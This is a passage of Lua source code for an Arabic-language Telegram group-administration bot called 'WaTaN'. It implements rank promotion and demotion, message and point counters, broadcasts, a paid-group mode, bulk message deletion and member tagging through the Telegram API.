send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم تنزيله من '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('^رفع (.*) @(.*)') and ChanSub(msg) and Mod(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_,text1[2])
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..text1[2]..'')   
end
else
info = '✯︙المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match('^تنزيل (.*) @(.*)') and ChanSub(msg) and Mod(msg) then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if database:sismember(bot_id..'Coomds'..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم تنريله من '..text1[2]..'')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.id_)
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'WaTaNTeaM')..')'..'\n✯︙تم تنريله من '..text1[2]..'')   
end
else
info = '✯︙المعرف غلط'
send(msg.chat_id_, msg.id_,info)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
if text == ("مسح نقاطه") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع مسح نقاط البوت ")
return false 
end
database:del(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم مسح نقاطه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^مسح نقاطه @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^مسح نقاطه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع مسح نقاط البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:del(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_)
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم مسح نقاطه'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^مسح نقاطه (%d+)$") and ChanSub(msg) and BasicConstructor(msg) then
local userid = text:match("^مسح نقاطه (%d+)$")
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع مسح نقاط البوت ")
return false 
end
database:del(bot_id..'NUM:GAMES'..msg.chat_id_..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم مسح نقاطه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم مسح نقاطه'
send(msg.chat_id_, msg.id_, usertext..status)
end
end,nil)
return false
end
if text == ("مسح رسائله") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع مسح رسائل البوت ")
return false 
end
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم مسح رسائله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^مسح رسائله @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^مسح رسائله @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع مسح رسائل البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) 
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WaTaNTeaM')..')'
status  = '\n✯︙تم مسح رسائله'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^مسح رسائله (%d+)$") and ChanSub(msg) and BasicConstructor(msg) then
local userid = text:match("^مسح رسائله (%d+)$")
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ✯︙لا تسطيع مسح رسائل البوت ")
return false 
end
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..userid) 
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙تم مسح رسائله'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
status  = '\n✯︙تم مسح رسائله'
send(msg.chat_id_, msg.id_, usertext..status)
end
end,nil)
return false
end

if text == "تفعيل الرسائل اليوميه" and Manager(msg) then
send(msg.chat_id_, msg.id_, '*✯︙تم تفعيل الرسائل اليوميه*')
database:set(bot_id.."msg:match:"..msg.chat_id_,true)
end
if text == "تعطيل الرسائل اليوميه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'*✯︙تم تعطيل الرسائل اليوميه*')
database:del(bot_id.." msg:match:"..msg.chat_id_)
end
if database:get(bot_id.."msg:match:"..msg.chat_id_) then
if msg.content_.ID then
get_msg = database:get(bot_id.."msg:match:"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
database:setex(bot_id..'msg:match:'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
if text == "تفاعلي اليوم" and tonumber(msg.reply_to_message_id_) == 0 then    
get_msg = database:get(bot_id.."msg:match:"..msg.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"*✯︙عدد رسائلك الكلي هو :-*\n"..get_msg.." *من الرسائل*")
end  
if text == "تفاعله اليوم" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
get_msg = database:get(bot_id.."msg:match:"..result.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"*✯︙عدد رسائل الشخص الكلي هو :-*\n"..get_msg.." *من الرسائل*")
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
end

if text == "مسح رسايلي" and ChanSub(msg) or text == "مسح رسائلي" and ChanSub(msg) or text == "حذف رسايلي" and ChanSub(msg) or text == "حذف رسائلي" and ChanSub(msg) then  
send(msg.chat_id_, msg.id_,'✯︙تم مسح رسائلك'  )  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if text == "رسايلي" and ChanSub(msg) or text == "رسائلي" and ChanSub(msg) or text == "msg" and ChanSub(msg) then 
send(msg.chat_id_, msg.id_,'✯︙عدد رسائلك » { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
if text == 'تفعيل الاذاعه' and ChanSub(msg) and DevWaTaN(msg) then  
if database:get(bot_id..'Bc:Bots') then
database:del(bot_id..'Bc:Bots') 
Text = '\n✯︙تم تفعيل الاذاعه' 
else
Text = '\n✯︙بالتاكيد تم تفعيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الاذاعه' and ChanSub(msg) and DevWaTaN(msg) then  
if not database:get(bot_id..'Bc:Bots') then
database:set(bot_id..'Bc:Bots',true) 
Text = '\n✯︙تم تعطيل الاذاعه' 
else
Text = '\n✯︙بالتاكيد تم تعطيل الاذاعه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الوضع المدفوع' and ChanSub(msg) and DevWaTaN(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,WaTaN) 
if not database:sismember(bot_id..'WaTaN:ProGroups',msg.chat_id_) then
database:sadd(bot_id..'WaTaN:ProGroups',msg.chat_id_) 
database:set(bot_id.."WaTaN:ProGroups:Time"..msg.chat_id_,os.date("%Y/%m/%d"))
WaTaN = '\n✯︙المجموعه ['..WaTaN.title_..'] \n✯︙تم تفعيل الوضع المدفوع بتاريخ '..os.date("%Y/%m/%d")..' \n✯︙سينتهي الوضع المدفوع بعد 30 يوم من الان'
else
WaTaN = '\n✯︙المجموعه ['..WaTaN.title_..'] \n✯︙بالفعل في الوضع المدفوع'
end
send(msg.chat_id_, msg.id_,WaTaN) 
end,nil) 
end
if text == 'تعطيل الوضع المدفوع' and ChanSub(msg) and DevWaTaN(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,WaTaN) 
if database:sismember(bot_id..'WaTaN:ProGroups',msg.chat_id_) then
database:srem(bot_id..'WaTaN:ProGroups',msg.chat_id_) 
database:del(bot_id.."WaTaN:ProGroups:Time"..msg.chat_id_)
WaTaN = '\n✯︙المجموعه ['..WaTaN.title_..'] \n✯︙تم حذفها من الوضع المدفوع'
else
WaTaN = '\n✯︙المجموعه ['..WaTaN.title_..'] \n✯︙بالفعل ليست من الوضع المدفوع'
end
send(msg.chat_id_, msg.id_,WaTaN) 
end,nil) 
end
if text == 'المجموعات المدفوعه' and ChanSub(msg) or text == 'الكروبات المدفوعه' and ChanSub(msg) and DevWaTaN(msg) then
local List = database:smembers(bot_id.."WaTaN:ProGroups")
local WaTaN = '✯︙المجموعات المدفوعه \n✯︙تاريخ اليوم'..os.date("%Y/%m/%d")..' \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n'
for k,v in pairs(List) do
local WaTaNgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
if WaTaNgetlink.ok == true then 
link_WaTaN = '['..WaTaNgetlink.result..']'
else
link_WaTaN = 'ليست لدي صلاحية الدعوه لهذه المجموعه'
end
WaTaN = WaTaN..k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."WaTaN:ProGroups:Time"..v).."`) \n- "..link_WaTaN.." \n" 
end
if #List == 0 then
WaTaN = '✯︙لاتوجد مجموعات مدفوعه'
end
send(msg.chat_id_, msg.id_,WaTaN) 
end
if text == 'تفعيل التواصل' and ChanSub(msg) and DevWaTaN(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n✯︙تم تفعيل التواصل' 
else
Text = '\n✯︙بالتاكيد تم تفعيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل' and ChanSub(msg) and DevWaTaN(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n✯︙تم تعطيل التواصل' 
else
Text = '\n✯︙بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي' and ChanSub(msg) and DevWaTaN(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n✯︙تم تفعيل البوت الخدمي' 
else
Text = '\n✯︙بالتاكيد تم تفعيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي' and ChanSub(msg) and DevWaTaN(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n✯︙تم تعطيل البوت الخدمي' 
else
Text = '\n✯︙بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^تنظيف (%d+)$') and ChanSub(msg) and Manager(msg) then
if not database:get(bot_id..'abbas:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^تنظيف (%d+)$')) 
if num > 1000 then 
send(msg.chat_id_, msg.id_,'✯︙تستطيع تنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'✯︙تم تنظيف {'..num..'}')  
database:setex(bot_id..'abbas:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if text and text:match('^مسح (%d+)$') and ChanSub(msg) and Manager(msg) then
if not database:get(bot_id..'abbas:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local num = tonumber(text:match('^مسح (%d+)$')) 
if num > 1000 then 
send(msg.chat_id_, msg.id_,'✯︙تستطيع مسح 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
DeleteMessage(msg.chat_id_, {[0] = msgm})
msgm = msgm - 1048576
end
send(msg.chat_id_,msg.id_,'✯︙تم مسح {'..num..'}')  
database:setex(bot_id..'abbas:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
if text and text:match("^(وضع وقت التنظيف) (%d+)$") and BasicConstructor(msg) then
local GetDo = tonumber(text:match("(%d+)"))
database:set(bot_id..':TiMsg:'..msg.chat_id_,GetDo) 
return send(msg.chat_id_, msg.id_,"*✯︙تم وضع وقت التنظيف كل ("..GetDo..") ساعات*")
end
if text == "تنظيف الميديا" and ChanSub(msg) and Manager(msg) or text == "امسح" and ChanSub(msg) and Manager(msg) or text == "تنظيف المديا" and ChanSub(msg) and Manager(msg) or text == "مسح الميديا" and ChanSub(msg) and Manager(msg) or text == "مسح المديا" and ChanSub(msg) and Manager(msg) then
msgm = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
msgm[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = msgm},function(arg,data)
new = 0
msgm2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
msgm2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,msgm2)
end,nil)  
send(msg.chat_id_, msg.id_,"✯︙تم تنظيف جميع الميديا")
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
database:sadd(bot_id.."abbas:allM"..msg.chat_id_, msg.id_)
end
if text == ("مسح الوسائط") and ChanSub(msg) and cleaner(msg) then  
local list = database:smembers(bot_id.."abbas:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "✯︙تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."abbas:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = "✯︙لا يوجد وسائط في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("عدد الميديا") and ChanSub(msg) and cleaner(msg) then  
local num = database:smembers(bot_id.."abbas:allM"..msg.chat_id_)
for k,v in pairs(num) do
local numl = v
if numl then
l = "✯︙عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = "✯︙لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, l)
end
if text == "تنظيف التعديل" and ChanSub(msg) and Manager(msg) then
Msgs = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Msgs[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data)
new = 0
Msgs2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Msgs2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Msgs2)
end,nil)  
send(msg.chat_id_, msg.id_,'✯︙تم تنظيف جميع الرسائل المعدله')
end
if text == "تغير اسم البوت" and ChanSub(msg) or text == "تغيير اسم البوت" and ChanSub(msg) then 
if DevWaTaN(msg) then
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل لي الاسم الان ")  
end
return false
end

if text == ""..(database:get(bot_id..'Name:Bot') or 'وطن').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'وطن')
local WaTaN_Msg = {
'عمغي 🥺💕.',
'ياروحي كول اني  '..Namebot..'',
'شتريد من '..Namebot..'',
'دوختو  '..Namebot..'',
' كافي لزكت 😡🤬',
'وبعدين وياك ؟ 🥺',
'فحطتني 🥵😓',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
'كول حبيبي ؟ اني '..Namebot..'',
'عمري فداك '..Namebot..' كول حب'
}
send(msg.chat_id_, msg.id_,'['..WaTaN_Msg[math.random(#WaTaN_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,'✯︙الاذاعه معطله من قبل المطور الاساسي')
return false
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل الان اذاعتك \n✯︙للخروج ارسل الغاء") 
return false
end 
if text=="اذاعه" and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,'✯︙الاذاعه معطله من قبل المطور الاساسي')
return false
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل الان اذاعتك \n✯︙للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" and ChanSub(msg) and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,'✯︙الاذاعه معطله من قبل المطور الاساسي')
return false
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and ChanSub(msg) and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,'✯︙الاذاعه معطله من قبل المطور الاساسي')
return false
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل لي التوجيه الان") 
return false
end 
if text and text:match('^ضع اسم (.*)') and ChanSub(msg) and Manager(msg) or text and text:match('^وضع اسم (.*)') and ChanSub(msg) and Manager(msg) then 
local Name = text:match('^ضع اسم (.*)') or text and text:match('^وضع اسم (.*)') 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_," ✯︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ✯︙ليست لدي صلاحية تغير اسم الكروب")  
else
sebd(msg.chat_id_,msg.id_,'✯︙تم تغيير اسم الكروب الى {['..Name..']}')  
end
end,nil) 
end
if text == "تاك للكل" and ChanSub(msg) and Mod(msg) then
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,WaTaN)
local t = "\nツ قائمة الاعضاء \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
x = 0
local list = WaTaN.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..x.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..x.." → {"..v.user_id_.."}\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end

if text and text:match("^تنزيل الكل @(.*)$") and ChanSub(msg) and Manager(msg) then
local username = text:match("^تنزيل الكل @(.*)$")
function start_function(extra, result, success)
if (result.id_) then
if tonumber(result.id_) == true then
send(msg.chat_id_, msg.id_,"✯︙لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id.."Sudo:User",result.id_) then
dev = "المطور ،" else dev = "" end
if database:sismember(bot_id.."CoSu"..msg.chat_id_,result.id_) then
cu = "المالك ،" else cu = "" end
if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if database:sismember(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Can_or_NotCan(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n✯︙تم تنزيل الشخص من الرتب التاليه \n✯︙{ "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..cu..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n✯︙عذرا العضو لايملك رتبه \n")
end
if tonumber(msg.sender_user_id_) == true then
database:srem(bot_id.."Sudo:User", result.id_)
database:srem(bot_id.."CoSu"..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id.."CoSu"..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."CoSu",msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id.."CoSu"..msg.chat_id_, result.id_)
database:sadd(bot_id.."CoSu"..msg.chat_id_, database:get(bot_id.."CoSuv"..msg.chat_id_))
elseif database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, start_function, nil)
end

if text == ("تنزيل الكل") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Manager(msg) then
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_," ✯︙لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if database:sismember(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_) then
cu = 'المالك ،' else cu = '' end
